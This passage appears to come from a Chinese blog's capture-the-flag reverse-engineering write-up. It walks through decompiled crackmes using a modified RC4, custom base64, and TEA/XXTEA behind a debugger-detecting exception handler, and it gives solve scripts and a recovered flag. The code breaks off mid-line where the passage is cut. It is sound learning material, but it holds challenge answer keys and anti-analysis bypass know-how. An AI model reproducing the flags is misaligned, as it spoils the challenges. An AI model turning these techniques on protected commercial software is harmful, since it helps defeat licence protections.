<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">255</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= <span class="number">0x100</span> )</span><br><span class="line">    runtime_panicIndex();</span><br><span class="line">  *(box + i) = <span class="number">-1</span> - i;</span><br><span class="line">&#125;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( count &lt; <span class="number">256</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = *(box + count);</span><br><span class="line">  v9 = count;</span><br><span class="line">  v10 = count - <span class="number">12</span> * (((<span class="number">2863311531LL</span> * count) &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v10 &gt;= <span class="number">0xC</span> )</span><br><span class="line">    runtime_panicIndex();</span><br><span class="line">  v7 += v35[v10] + v8;</span><br><span class="line">  *(box + v9) = *(box + v7);</span><br><span class="line">  *(box + v7) = v8;</span><br><span class="line">  count = v9 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">sub_462C00(&amp;PRGA_result, box);</span><br><span class="line">flag_context = v4;</span><br><span class="line">lenth_of_context = v34;</span><br><span class="line">v26 = v11;</span><br><span class="line">main_PRGA(PRGA_result);</span><br></pre></td></tr></table></figure>

<p>Sbox初始化 PRGA 但是不是普通的RC4加密 进入PRGA函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __usercall main_PRGA@&lt;eax&gt;(<span class="type">char</span> table)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// bp</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// si</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+12h] [ebp-2h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [esp+14h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(*__readfsdword(runtime_tls_g) + <span class="number">8</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  result = runtime_makeslice(&amp;uint8, STACK[<span class="number">0x11C</span>], STACK[<span class="number">0x11C</span>]);</span><br><span class="line">  v2 = STACK[<span class="number">0x11C</span>];</span><br><span class="line">  v3 = STACK[<span class="number">0x118</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *(&amp;table + (v5 + <span class="number">1</span>));</span><br><span class="line">    v8 = v7 + v6;</span><br><span class="line">    *(&amp;table + (v5 + <span class="number">1</span>)) = *(&amp;table + (v7 + v6));</span><br><span class="line">    *(&amp;table + (v7 + v6)) = v7;</span><br><span class="line">    *(result + v4) = *(&amp;table + (v7 + *(&amp;table + (v5 + <span class="number">1</span>)))) ^ *(v3 + v4) ^ <span class="number">0x2F</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">    v2 = STACK[<span class="number">0x11C</span>];</span><br><span class="line">    ++v5;</span><br><span class="line">    v6 = v8;</span><br><span class="line">  &#125;</span><br><span class="line">  STACK[<span class="number">0x124</span>] = result;</span><br><span class="line">  STACK[<span class="number">0x128</span>] = v2;</span><br><span class="line">  STACK[<span class="number">0x12C</span>] = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>动调发现<code>v3</code>存放的就是输入的flag去除begin{}包裹的内容 所以加密只关心和其异或的东西 在最后异或步骤下状况断点 输出存放异或的数字的寄存器:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110639.png" alt="image-20240206140321081"></p>
<p>得到异或内容:</p>
<p><code>xor_key = [i ^ 0x2f for i in [132, 14, 121, 193, 41, 61, 231, 134, 147, 244, 180, 102, 100, 175, 25, 151, 133, 7, 230, 74, 200, 3, 55]]</code></p>
<p>最后一处加密的核心特征:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110639-1.png" alt="image-20240206140631616"></p>
<p>从64长度的表中按第二处加密得到的结果为下标取元素 最后和密文比较 猜测是换表base64</p>
<p>第二处加密:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v20 = main_byteArrayToBigInt(result, lenth_2);</span><br><span class="line">v22 = main_bigIntModToArray(str_head);</span><br></pre></td></tr></table></figure>

<p>动调发现第一个函数的作用就是将第一处加密得到的结果按小端序储存为Go中的一种大整型数据(没有位数上限 能储存多大取决于计算机)</p>
<p>第二个函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int128 __golang <span class="title function_">main_bigIntModToArray</span><span class="params">(<span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> *mod_result_instanc; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> now_result; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> origin_data; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> count_1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> add_; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> *final_procees; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> *result_; <span class="comment">// [esp+Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> *v12; <span class="comment">// [esp+14h] [ebp-64h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [esp+18h] [ebp-60h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+1Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+20h] [ebp-58h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// [esp+24h] [ebp-54h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// [esp+28h] [ebp-50h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp+28h] [ebp-50h]</span></span><br><span class="line">  <span class="type">int</span> mod_num_2; <span class="comment">// [esp+2Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> mod_num; <span class="comment">// [esp+30h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp+44h] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v22[<span class="number">4</span>]; <span class="comment">// [esp+48h] [ebp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> mod_n[<span class="number">4</span>]; <span class="comment">// [esp+58h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> be_moded_instanc[<span class="number">4</span>]; <span class="comment">// [esp+68h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [esp+78h] [ebp+0h] BYREF</span></span><br><span class="line">  __int128 result; <span class="comment">// [esp+80h] [ebp+8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(*__readfsdword(runtime_tls_g) + <span class="number">8</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  mod_result_instanc = a1;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i = v16 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( mod_result_instanc[<span class="number">2</span>] )</span><br><span class="line">      v5 = *mod_result_instanc ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v17 = v2;</span><br><span class="line">    v21 = v3;</span><br><span class="line">    LOBYTE(be_moded_instanc[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;be_moded_instanc[<span class="number">1</span>], <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">    mod_num = <span class="number">64</span>;</span><br><span class="line">    LOBYTE(mod_n[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">    mod_n[<span class="number">1</span>] = &amp;mod_num;</span><br><span class="line">    mod_n[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    mod_n[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">    result_ = math_big__Int_Mod(be_moded_instanc, mod_result_instanc, mod_n);</span><br><span class="line">    <span class="keyword">if</span> ( result_[<span class="number">2</span>] )</span><br><span class="line">      now_result = *result_[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      now_result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *result_ )</span><br><span class="line">      origin_data = -now_result;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      origin_data = now_result;</span><br><span class="line">    count_1 = i + <span class="number">1</span>;</span><br><span class="line">    add_ = v17;</span><br><span class="line">    <span class="keyword">if</span> ( v17 &lt; i + <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = origin_data;</span><br><span class="line">      v12 = runtime_growslice(v21, i + <span class="number">1</span>, v17, <span class="number">1</span>, &amp;<span class="type">int</span>);</span><br><span class="line">      count_1 = v13;</span><br><span class="line">      final_procees = v12;</span><br><span class="line">      add_ = v14;</span><br><span class="line">      origin_data = v15;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      final_procees = v21;</span><br><span class="line">    &#125;</span><br><span class="line">    v21 = final_procees;</span><br><span class="line">    v16 = count_1;</span><br><span class="line">    v18 = add_;</span><br><span class="line">    final_procees[count_1 - <span class="number">1</span>] = origin_data;</span><br><span class="line">    mod_num_2 = <span class="number">0x40</span>;</span><br><span class="line">    LOBYTE(v22[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">    v22[<span class="number">1</span>] = &amp;mod_num_2;</span><br><span class="line">    v22[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    v22[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">    math_big__Int_Div(a1, a1, v22);</span><br><span class="line">    mod_result_instanc = a1;</span><br><span class="line">    v3 = v21;</span><br><span class="line">    v2 = v18;</span><br><span class="line">  &#125;</span><br><span class="line">  *&amp;result = __PAIR64__(i, v3);</span><br><span class="line">  DWORD2(result) = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心是其中的大整型取模和大整型除法 动调发现取模和除法都是对第一个函数得到的大整型进行 另一个操作数是<code>0x40</code>也就是<code>result = big_int &amp; 0xFFFFFF, big_int &gt;&gt; 6</code>符合之前base64的猜测(但是直接用base64解出来不对 所以自己写解密脚本):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">xor_key = [i ^ <span class="number">0x2f</span> <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">132</span>, <span class="number">14</span>, <span class="number">121</span>, <span class="number">193</span>, <span class="number">41</span>, <span class="number">61</span>, <span class="number">231</span>, <span class="number">134</span>, <span class="number">147</span>, <span class="number">244</span>, <span class="number">180</span>, <span class="number">102</span>, <span class="number">100</span>, <span class="number">175</span>, <span class="number">25</span>, <span class="number">151</span>, <span class="number">133</span>, <span class="number">7</span>, <span class="number">230</span>, <span class="number">74</span>, <span class="number">200</span>, <span class="number">3</span>, <span class="number">55</span>]]</span><br><span class="line">enc = [<span class="string">&quot;8G+cazk2jqb7w01CtoKH4FsrgR3vVmQ9pPhXLAleOd/nB6DfIxMWYiUZ5SEJyNuT&quot;</span>.index(i) <span class="keyword">for</span> i <span class="keyword">in</span><span class="string">&quot;HZ0sMJXqxHgUb2b9RNg+1xw&quot;</span>]</span><br><span class="line">enc = [<span class="built_in">bin</span>(i).replace(<span class="string">&quot;0b&quot;</span>, <span class="string">&quot;&quot;</span>).zfill(<span class="number">6</span>) <span class="keyword">for</span> i <span class="keyword">in</span> enc][::-<span class="number">1</span>]</span><br><span class="line">big_int = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(enc), <span class="number">2</span>)</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">while</span> big_int &gt; <span class="number">0</span>:</span><br><span class="line">    flag.append(big_int &amp; <span class="number">0xff</span>)</span><br><span class="line">    big_int &gt;&gt;= <span class="number">8</span></span><br><span class="line">flag = flag[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i] ^ xor_key[i]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># go_a_nice_journey</span></span><br></pre></td></tr></table></figure>



<h2 id="not-main-反调试"><a href="#not-main-反调试" class="headerlink" title="not main | 反调试"></a>not main | 反调试</h2><p>IDA识别出的主函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  __int32 *pt_input1; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> __int32 now; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> sum; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> __int32 next; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// edi</span></span><br><span class="line">  __int32 *pt_input3; <span class="comment">// ecx</span></span><br><span class="line">  __int32 *v10; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">bool</span> v12; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp-4h] [ebp-2Ch]</span></span><br><span class="line">  __int32 *pt_input2; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  __int128 v18; <span class="comment">// [esp+10h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_141930(<span class="built_in">std</span>::<span class="built_in">cin</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(enc);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">0x1A</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pt_input1 = enc;</span><br><span class="line">    pt_input2 = enc;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      now = *pt_input1;</span><br><span class="line">      sum = <span class="number">0</span>;                                  <span class="comment">// TEA</span></span><br><span class="line">      next = pt_input1[<span class="number">1</span>];</span><br><span class="line">      v8 = <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">        now += ((next &gt;&gt; <span class="number">5</span>) + <span class="number">97</span>) ^ (<span class="number">16</span> * next + <span class="number">102</span>) ^ (sum + next);</span><br><span class="line">        next += ((now &gt;&gt; <span class="number">5</span>) + <span class="number">101</span>) ^ (<span class="number">16</span> * now + <span class="number">107</span>) ^ (sum + now);</span><br><span class="line">        --v8;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v8 );</span><br><span class="line">      *pt_input2 = now;</span><br><span class="line">      pt_input2[<span class="number">1</span>] = next;</span><br><span class="line">      pt_input1 = pt_input2 + <span class="number">2</span>;</span><br><span class="line">      pt_input2 = pt_input1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( pt_input1 &lt; &amp;debug_flag_1 );</span><br><span class="line">    pt_input3 = enc;</span><br><span class="line">    v10 = to_cmp;</span><br><span class="line">    v11 = <span class="number">28</span>;</span><br><span class="line">    <span class="keyword">while</span> ( *pt_input3 == *v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++pt_input3;</span><br><span class="line">      ++v10;</span><br><span class="line">      v12 = v11 &lt; <span class="number">4</span>;</span><br><span class="line">      v11 -= <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">      &#123;</span><br><span class="line">        v18 = xmmword_143220;</span><br><span class="line">        LOBYTE(v19) = <span class="number">19</span>;</span><br><span class="line">        v13 = <span class="number">0</span>;</span><br><span class="line">        v3 = <span class="built_in">strlen</span>(&amp;v18);</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">            *(&amp;v18 + v13++) ^= <span class="number">0x13</span>u;</span><br><span class="line">          <span class="keyword">while</span> ( v13 &lt; &amp;v18 + <span class="built_in">strlen</span>(&amp;v18) + <span class="number">1</span> - (&amp;v18 + <span class="number">1</span>) );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_11:                                       <span class="comment">// fail</span></span><br><span class="line">    v14 = sub_141600(v3, sub_141830);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v14, v16);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>包含一个TEA 但是解出来是假flag <code>while ( pt_input1 &lt; &amp;debug_flag_1 );</code>这一行对flag交叉引用到达一个异常处理函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_141010</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint8_t</span> BeingDebugged; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  BeingDebugged = NtCurrentPeb()-&gt;BeingDebugged;</span><br><span class="line">  debug_flag_1 = BeingDebugged != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( BeingDebugged )</span><br><span class="line">    AddVectoredExceptionHandler(<span class="number">1u</span>, Handler);</span><br><span class="line">  <span class="keyword">return</span> atexit(sub_142AE0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Handler</code>应该就是程序正常运行过程中主函数触发异常后执行的处理函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LONG __userpurge Handler@&lt;eax&gt;(<span class="type">int</span> a1@&lt;edi&gt;, <span class="keyword">struct</span> _EXCEPTION_POINTERS *ExceptionInfo)</span><br><span class="line">&#123;</span><br><span class="line">  DWORD ExceptionCode; <span class="comment">// eax</span></span><br><span class="line">  PCONTEXT ContextRecord; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> sum; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int32 temp; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">bool</span> v9; <span class="comment">// zf</span></span><br><span class="line">  _DWORD *real_enc; <span class="comment">// edx</span></span><br><span class="line">  __int32 *v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">bool</span> v13; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp-10h] [ebp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> addr_13503C; <span class="comment">// [esp+4h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+8h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [esp+Ch] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> temp_2; <span class="comment">// [esp+10h] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> key[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v23[<span class="number">3</span>]; <span class="comment">// [esp+24h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ExceptionCode = ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode;</span><br><span class="line">  <span class="keyword">if</span> ( ExceptionCode == <span class="number">-2147483645</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ContextRecord = ExceptionInfo-&gt;ContextRecord;</span><br><span class="line">    dword_145038 = <span class="number">0</span>;</span><br><span class="line">    ++ContextRecord-&gt;Eip;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ExceptionCode == <span class="number">0xC0000094</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    key[<span class="number">0</span>] = <span class="number">116</span>;</span><br><span class="line">    addr_13503C = to_cmp ^ ::addr_13503C;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    ::addr_13503C ^= to_cmp;</span><br><span class="line">    temp = enc_7_;</span><br><span class="line">    key[<span class="number">1</span>] = <span class="number">114</span>;</span><br><span class="line">    key[<span class="number">2</span>] = <span class="number">117</span>;</span><br><span class="line">    key[<span class="number">3</span>] = <span class="number">101</span>;</span><br><span class="line">    v19 = <span class="number">12</span>;</span><br><span class="line">    temp_2 = enc_7_;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v20 = sum - <span class="number">0x61C88647</span>;</span><br><span class="line">      v7 = ((sum - <span class="number">0x61C88647</span>) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        enc[i] += ((v20 ^ enc_1_[i]) + (temp_2 ^ key[v7 ^ i &amp; <span class="number">3</span>])) ^ (((<span class="number">16</span> * temp_2) ^ (enc_1_[i] &gt;&gt; <span class="number">3</span>))</span><br><span class="line">                                                                    + ((temp &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * enc_1_[i])));</span><br><span class="line">        temp = enc[i];</span><br><span class="line">        temp_2 = temp;</span><br><span class="line">      &#125;</span><br><span class="line">      sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">      temp = (((v20 ^ enc[<span class="number">0</span>]) + (temp ^ key[v7 ^ i &amp; <span class="number">3</span>])) ^ (((<span class="number">16</span> * temp) ^ (enc[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>)) + ((temp &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * enc[<span class="number">0</span>]))))</span><br><span class="line">           + enc_7_;</span><br><span class="line">      v9 = v19-- == <span class="number">1</span>;</span><br><span class="line">      temp_2 = temp;</span><br><span class="line">      enc_7_ = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v9 );</span><br><span class="line">    real_enc = addr_13503C;</span><br><span class="line">    v11 = enc;</span><br><span class="line">    v12 = <span class="number">28</span>;</span><br><span class="line">    <span class="keyword">while</span> ( *v11 == *real_enc )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v11;</span><br><span class="line">      ++real_enc;</span><br><span class="line">      v13 = v12 &lt; <span class="number">4</span>;</span><br><span class="line">      v12 -= <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v13 )</span><br><span class="line">      &#123;</span><br><span class="line">        v23[<span class="number">0</span>] = <span class="number">862354538</span>;</span><br><span class="line">        v23[<span class="number">1</span>] = <span class="number">862418548</span>;</span><br><span class="line">        v23[<span class="number">2</span>] = <span class="number">322070394</span>;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(v23); ++j )</span><br><span class="line">          *(v23 + j) ^= <span class="number">0x13</span>u;</span><br><span class="line">        v15 = sub_141600(sub_141830, a1);</span><br><span class="line">        <span class="built_in">std</span>::ostream::operator&lt;&lt;(v15, v16);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ExceptionInfo-&gt;ContextRecord-&gt;Ecx = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>包含一个XXTEA加密 keygen:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> delta = <span class="number">0x61C88647</span>;</span><br><span class="line"><span class="type">unsigned</span> __int32 enc[] = &#123;</span><br><span class="line">    <span class="number">0xCFBE0F1B</span>, <span class="number">0x5F3083F</span>, <span class="number">0x4220E43B</span>, <span class="number">0x3383AFEE</span>, <span class="number">0xFA3237CE</span>, <span class="number">0xECADA66E</span>, <span class="number">0xA8D47CA7</span>, <span class="number">0xEFC51077</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> key[<span class="number">4</span>] = &#123;<span class="number">116</span>, <span class="number">114</span>, <span class="number">117</span>, <span class="number">101</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TEA decrypt</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">11</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">-12</span> * <span class="number">0x61C88647</span>;</span><br><span class="line">    <span class="type">int</span> delta = <span class="number">0x61C88647</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="type">int</span> j = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        enc[<span class="number">7</span>] -= (((sum ^ enc[<span class="number">0</span>]) + (enc[<span class="number">6</span>] ^ key[j ^ <span class="number">7</span> &amp; <span class="number">3</span>])) ^ (((<span class="number">16</span> * enc[<span class="number">6</span>]) ^ (enc[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>)) + ((enc[<span class="number">6</span>] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * enc[<span class="number">0</span>]))));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">6</span>; i &gt;= <span class="number">1</span>; i--)&#123;</span><br><span class="line">            enc[i] -= (((sum ^ enc[i + <span class="number">1</span>]) + (enc[i - <span class="number">1</span>] ^ key[j ^ i &amp; <span class="number">3</span>])) ^ (((<span class="number">16</span> * enc[i - <span class="number">1</span>]) ^ (enc[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((enc[i - <span class="number">1</span>] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * enc[i + <span class="number">1</span>]))));</span><br><span class="line">        &#125;</span><br><span class="line">        enc[<span class="number">0</span>] -= (((sum ^ enc[<span 